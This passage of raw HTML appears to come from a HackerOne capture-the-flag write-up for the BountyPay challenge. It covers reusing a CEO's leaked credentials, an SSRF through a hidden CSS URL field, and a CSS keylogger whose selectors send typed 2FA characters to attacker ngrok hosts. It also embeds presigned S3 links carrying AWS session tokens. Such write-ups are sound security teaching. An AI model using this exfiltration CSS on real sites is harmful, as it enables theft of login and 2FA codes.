class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Report received\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"step-13-information-disclosure-ceo-username\"\u003eStep 13 - Information Disclosure (CEO username \u0026amp; password)\u003c/h3\u003e\n\n\u003cp\u003eAs an Admind I was able to see the application\u0026#39;s users: \u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"application-users.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/aSUcBZ8JdnAaFmt6SuMpsPFZ?response-content-disposition=attachment%3B%20filename%3D%22application-users.png%22%3B%20filename%2A%3DUTF-8%27%27application-users.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070744Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026amp;X-Amz-Signature=3def53ebf48ac4cb30683a998b25ab2313efb1486bdfc93d302c866b57aca82b\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/aSUcBZ8JdnAaFmt6SuMpsPFZ?response-content-disposition=attachment%3B%20filename%3D%22application-users.png%22%3B%20filename%2A%3DUTF-8%27%27application-users.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070744Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026amp;X-Amz-Signature=3def53ebf48ac4cb30683a998b25ab2313efb1486bdfc93d302c866b57aca82b\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eso I took the Marten Mickos\u0026#39; credentials, opened \u003ca title=\"https://app.bountypay.h1ctf.com\" href=\"/redirect?url=https%3A%2F%2Fapp.bountypay.h1ctf.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://app.bountypay.h1ctf.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and logged in by passing the 2FA from step 3. \u003c/p\u003e\n\n\u003ch3 id=\"step-14-ssrf\"\u003eStep 14 - SSRF\u003c/h3\u003e\n\n\u003cp\u003eAs mentioned at the beginning, I knew that I was suppose to find a way to make May 2020\u0026#39;s payments, so I directly loaded this date and got the payment button: \u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"payment-2.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/VdyhNNB8fZ8DE9KEnRH3MXsy?response-content-disposition=attachment%3B%20filename%3D%22payment-2.png%22%3B%20filename%2A%3DUTF-8%27%27payment-2.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070744Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026amp;X-Amz-Signature=9ce79da59c179f7f98227ec2e8edddcf751c0160db23dad5e99ddb5aadd86fcd\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/VdyhNNB8fZ8DE9KEnRH3MXsy?response-content-disposition=attachment%3B%20filename%3D%22payment-2.png%22%3B%20filename%2A%3DUTF-8%27%27payment-2.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070744Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026amp;X-Amz-Signature=9ce79da59c179f7f98227ec2e8edddcf751c0160db23dad5e99ddb5aadd86fcd\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI clicked next and saw an interesting hidden input which was using a .css URL: \u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"payment-1.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/iqpwzLA5a4kEQPGQNh44jU93?response-content-disposition=attachment%3B%20filename%3D%22payment-1.png%22%3B%20filename%2A%3DUTF-8%27%27payment-1.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070744Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026amp;X-Amz-Signature=6f7b8a40fa3636dde7be816a3da0db75a1c642f4eb10c81810558af876dbf478\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/iqpwzLA5a4kEQPGQNh44jU93?response-content-disposition=attachment%3B%20filename%3D%22payment-1.png%22%3B%20filename%2A%3DUTF-8%27%27payment-1.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070744Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026amp;X-Amz-Signature=6f7b8a40fa3636dde7be816a3da0db75a1c642f4eb10c81810558af876dbf478\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI replaced this URL with my own URL using ngrok, and started to play with that. I assumed the following: \u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eIt had something to do with the 2FA application.\u003c/li\u003e\n\u003cli\u003eIt had a hint within the original css file. \u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eTemplate for the UNI 2FA App\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cul\u003e\n\u003cli\u003eThe css was loaded somewhere else by the server.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch3 id=\"step-15-css-keylogger-via-ssrf\"\u003eStep 15 - CSS Keylogger via SSRF\u003c/h3\u003e\n\n\u003cp\u003eAfter playing around I \u003ca href=\"/redirect?url=https%3A%2F%2Fcss-tricks.com%2Fcss-keylogger%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eread about a way to create a CSS KeyLogger\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and implemented it by myself and it worked. However, I had a problem figuring out the order of the request, which made me create a very specific css, for example: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003einput:first-child[value$=\u0026quot; \u0026quot;] { background-image: url(\u0026quot;https://8c7a64aff54e.ngrok.io/+\u0026quot;); }\ninput:nth-child(2)[value$=\u0026quot; \u0026quot;] { background-image: url(\u0026quot;https://8c7a64aff54e.ngrok.io/+-2\u0026quot;); }\ninput:nth-child(2)[value$=\u0026quot; \u0026quot;] { background-image: url(\u0026quot;https://dd36dc8b7bc5.ngrok.io/+-3\u0026quot;); }\ninput:nth-child(4)[value$=\u0026quot; \u0026quot;] { background-image: url(\u0026quot;https://8c7a64aff54e.ngrok.io/+-4\u0026quot;); }\ninput:nth-child(5)[value$=\u0026quot; \u0026quot;] { background-image: url(\u0026quot;https://8c7a64aff54e.ngrok.io/+-5\u0026quot;); }\ninput:nth-child(6)[value$=\u0026quot; \u0026quot;] { background-image: url(\u0026quot;https://8c7a64aff54e.ngrok.io/+-6\u0026quot;); }\ninput:nth-child(7)[value$=\u0026quot; \u0026quot;] { background-image: url(\u0026quot;https://8c7a64aff54e.ngrok.io/+-7\u0026quot;); }\ninput:nth-child(8)[value$=\u0026quot; \u0026quot;] { background-image: url(\u0026quot;https://8c7a64aff54e.ngrok.io/+-8\u0026quot;); }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis ended up with the following requests: \u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"payment-3.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/MKmQWT9EQRdR6EEnL4FNXQF2?response-content-disposition=attachment%3B%20filename%3D%22payment-3.png%22%3B%20filename%2A%3DUTF-8%27%27payment-3.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070744Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026amp;X-Amz-Signature=a7f466160b1a3051f089041ef0f6688dd4ff8e3e734849558ce404d3203e51b4\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/MKmQWT9EQRdR6EEnL4FNXQF2?response-content-disposition=attachment%3B%20filename%3D%22payment-3.png%22%3B%20filename%2A%3DUTF-8%27%27payment-3.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070744Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026amp;X-Amz-Signature=a7f466160b1a3051f089041ef0f6688dd4ff8e3e734849558ce404d3203e51b4\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eand that way I was able to find the flag:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"bountypay-completed.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7q1BPTY3DQ3V2Aw4WnpyoxUS?response-content-disposition=attachment%3B%20filename%3D%22bountypay-completed.png%22%3B%20filename%2A%3DUTF-8%27%27bountypay-completed.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070744Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDj